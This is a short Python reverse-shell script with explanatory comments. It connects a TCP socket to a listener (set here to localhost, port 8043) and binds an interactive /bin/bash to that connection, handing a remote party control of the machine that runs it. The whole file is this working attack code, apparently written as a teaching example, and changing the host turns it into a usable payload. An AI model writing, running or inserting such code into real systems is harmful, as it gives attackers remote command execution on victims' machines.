import socket #Standard socket libray
from subprocess import Popen #Interact with the sub-created process
 
RHOST = 'localhost' #Remote host to connect to.
RPORT = 8043 #Remote port where our machine will be listening

SHELL = ['/bin/bash', '-i'] #Shell to be send, an array is used to indicate a parameter, needed by the subprocess library
 
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Create a new instance and indicate that we will use IPv4(AF_INET) and TCP(SOCK_STREAM)

sock.connect((RHOST, RPORT)) #Connection
descriptor = sock.fileno() #File descriptor, if fails we get a "-1" and "3" if successful.
Popen(SHELL, stdin=descriptor, stdout=descriptor, stderr=descriptor) #Descriptors.